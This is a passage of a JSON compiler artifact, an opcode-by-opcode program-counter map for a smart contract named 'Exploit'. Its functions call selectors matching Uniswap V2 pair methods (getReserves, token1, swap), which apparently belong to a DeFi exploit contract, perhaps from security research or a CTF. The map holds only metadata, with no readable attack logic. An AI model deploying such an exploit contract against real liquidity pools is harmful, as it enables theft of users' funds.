      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2020": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP8",
      "path": "0"
    },
    "2021": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2022": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "2023": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2024": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2025": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2026": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x7F2"
    },
    "2029": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2030": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2032": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2033": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2034": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2035": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "POP",
      "path": "0"
    },
    "2036": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "GAS",
      "path": "0"
    },
    "2037": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "CALL",
      "path": "0"
    },
    "2038": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2039": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2040": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2041": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x806"
    },
    "2044": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2045": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2046": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2048": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2049": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2050": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2051": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2053": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2054": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2055": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "POP",
      "path": "0"
    },
    "2056": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "POP",
      "path": "0"
    },
    "2057": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "POP",
      "path": "0"
    },
    "2058": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "POP",
      "path": "0"
    },
    "2059": {
      "fn": "Exploit.start",
      "offset": [
        1894,
        2233
      ],
      "op": "POP",
      "path": "0"
    },
    "2060": {
      "fn": "Exploit.start",
      "jump": "o",
      "offset": [
        1860,
        2233
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2061": {
      "fn": "Exploit.main",
      "offset": [
        2239,
        2805
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2062": {
      "fn": "Exploit.main",
      "offset": [
        2275,
        2287
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2064": {
      "fn": "Exploit.main",
      "offset": [
        2275,
        2287
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2065": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x8"
    },
    "2067": {
      "fn": "Exploit.main",
      "offset": [
        2275,
        2287
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2068": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "ADD",
      "path": "0"
    },
    "2069": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2071": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2072": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2073": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2074": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x100"
    },
    "2077": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "EXP",
      "path": "0"
    },
    "2078": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2079": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "DIV",
      "path": "0"
    },
    "2080": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2082": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2084": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2086": {
      "op": "SHL"
    },
    "2087": {
      "op": "SUB"
    },
    "2088": {
      "fn": "Exploit.main",
      "offset": [
        2320,
        2337
      ],
      "op": "AND",
      "path": "0"
    },
    "2089": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2091": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2093": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2095": {
      "op": "SHL"
    },
    "2096": {
      "op": "SUB"
    },
    "2097": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2350
      ],
      "op": "AND",
      "path": "0"
    },
    "2098": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2350
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x902F1AC"
    },
    "2103": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2105": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2106": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2107": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "2112": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "AND",
      "path": "0"
    },
    "2113": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "2115": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "SHL",
      "path": "0"
    },
    "2116": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2117": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2118": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2120": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "ADD",
      "path": "0"
    },
    "2121": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "2123": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2125": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2126": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2127": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2128": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "SUB",
      "path": "0"
    },
    "2129": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2130": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2131": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "GAS",
      "path": "0"
    },
    "2132": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "2133": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2134": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2135": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2136": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x865"
    },
    "2139": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2140": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2141": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2143": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2144": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2145": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2146": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2148": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2149": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2150": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "POP",
      "path": "0"
    },
    "2151": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "POP",
      "path": "0"
    },
    "2152": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "POP",
      "path": "0"
    },
    "2153": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "POP",
      "path": "0"
    },
    "2154": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2156": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2157": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2158": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2160": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "NOT",
      "path": "0"
    },
    "2161": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2163": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2164": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "ADD",
      "path": "0"
    },
    "2165": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "AND",
      "path": "0"
    },
    "2166": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2167": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "ADD",
      "path": "0"
    },
    "2168": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2169": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2171": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2172": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "POP",
      "path": "0"
    },
    "2173": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2174": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "ADD",
      "path": "0"
    },
    "2175": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2176": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x889"
    },
    "2179": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2180": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2181": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1376"
    },
    "2184": {
      "fn": "Exploit.main",
      "jump": "i",
      "offset": [
        2307,
        2352
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2185": {
      "fn": "Exploit.main",
      "offset": [
        2307,
        2352
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2186": {
      "op": "POP"
    },
    "2187": {
      "fn": "Exploit.main",
      "offset": [
        2396,
        2410
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x8"
    },
    "2189": {
      "fn": "Exploit.main",
      "offset": [
        2396,
        2413
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2190": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2192": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2193": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2194": {
      "op": "PUSH4",
      "value": "0xD21220A7"
    },
    "2199": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2201": {
      "op": "SHL"
    },
    "2202": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2203": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2204": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2205": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2206": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2208": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2210": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "2212": {
      "op": "SHL"
    },
    "2213": {
      "op": "SUB"
    },
    "2214": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "2215": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "DUP6",
      "path": "0"
    },
    "2216": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "AND",
      "path": "0"
    },
    "2217": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "SWAP7",
      "path": "0"
    },
    "2218": {
      "op": "POP"
    },
    "2219": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "2220": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2221": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "2222": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "AND",
      "path": "0"
    },
    "2223": {
      "fn": "Exploit.main",
      "offset": [
        2274,
        2352
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "2224": {
      "op": "POP"
    },
    "2225": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2227": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2229": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2231": {
      "op": "SHL"
    },
    "2232": {
      "op": "SUB"
    },
    "2233": {
      "fn": "Exploit.main",
      "offset": [
        2396,
        2413
      ],
      "op": "AND",
      "path": "0"
    },
    "2234": {
      "fn": "Exploit.main",
      "offset": [
        2396,
        2413
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2235": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2421
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xD21220A7"
    },
    "2240": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2421
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2241": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2243": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2244": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2245": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "ADD",
      "path": "0"
    },
    "2246": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "2247": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2249": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "2250": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2251": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2252": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2253": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2254": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SUB",
      "path": "0"
    },
    "2255": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "ADD",
      "path": "0"
    },
    "2256": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2257": {
      "fn": "Exploit.main",
      "offset": [
        2396,
        2413
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2258": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "GAS",
      "path": "0"
    },
    "2259": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "2260": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2261": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2262": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2263": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x8E4"
    },
    "2266": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2267": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2268": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2270": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2271": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2272": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2273": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2275": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2276": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2277": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "POP",
      "path": "0"
    },
    "2278": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "POP",
      "path": "0"
    },
    "2279": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "POP",
      "path": "0"
    },
    "2280": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "POP",
      "path": "0"
    },
    "2281": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2283": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2284": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2285": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2287": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "NOT",
      "path": "0"
    },
    "2288": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2290": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2291": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "ADD",
      "path": "0"
    },
    "2292": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "AND",
      "path": "0"
    },
    "2293": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2294": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "ADD",
      "path": "0"
    },
    "2295": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2296": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2298": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2299": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "POP",
      "path": "0"
    },
    "2300": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2301": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "ADD",
      "path": "0"
    },
    "2302": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2303": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x908"
    },
    "2306": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2307": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2308": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13C6"
    },
    "2311": {
      "fn": "Exploit.main",
      "jump": "i",
      "offset": [
        2383,
        2423
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2312": {
      "fn": "Exploit.main",
      "offset": [
        2383,
        2423
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2313": {
      "fn": "Exploit.main",
      "offset": [
        2374,
        2378
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x2"
    },
    "2315": {
      "fn": "Exploit.main",
      "offset": [
        2374,
        2378
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2316": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2318": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2320": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2322": {
      "op": "SHL"
    },
    "2323": {
      "op": "SUB"
    },
    "2324": {
      "fn": "Exploit.main",
      "offset": [
        2366,
        2423
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2325": {
      "fn": "Exploit.main",
      "offset": [
        2366,
        2423
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2326": {
      "fn": "Exploit.main",
      "offset": [
        2366,
        2423
      ],
      "op": "AND",
      "path": "0"
    },
    "2327": {
      "fn": "Exploit.main",
      "offset": [
        2374,
        2378
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2328": {
      "fn": "Exploit.main",
      "offset": [
        2374,
        2378
      ],
      "op": "AND",
      "path": "0"
    },
    "2329": {
      "branch": 25,
      "fn": "Exploit.main",
      "offset": [
        2366,
        2423
      ],
      "op": "SUB",
      "path": "0"
    },
    "2330": {
      "fn": "Exploit.main",
      "offset": [
        2362,
        2651
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x9B9"
    },
    "2333": {
      "branch": 25,
      "fn": "Exploit.main",
      "offset": [
        2362,
        2651
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2334": {
      "fn": "Exploit.main",
      "offset": [
        2452,
        2466
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 10,
      "value": "0x8"
    },
    "2336": {
      "fn": "Exploit.main",
      "offset": [
        2452,
        2469
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2337": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2339": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2341": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2343": {
      "op": "SHL"
    },
    "2344": {
      "op": "SUB"
    },
    "2345": {
      "fn": "Exploit.main",
      "offset": [
        2452,
        2469
      ],
      "op": "AND",
      "path": "0"
    },
    "2346": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2475
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x22C0D9F"
    },
    "2351": {
      "fn": "Exploit.main",
      "offset": [
        2467,
        2468
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2353": {
      "fn": "Exploit.main",
      "offset": [
        2479,
        2490
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x93B"
    },
    "2356": {
      "fn": "Exploit.main",
      "offset": [
        2452,
        2469
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "2358": {
      "fn": "Exploit.main",
      "offset": [
        2479,
        2486
      ],
      "op": "DUP6",
      "path": "0"
    },
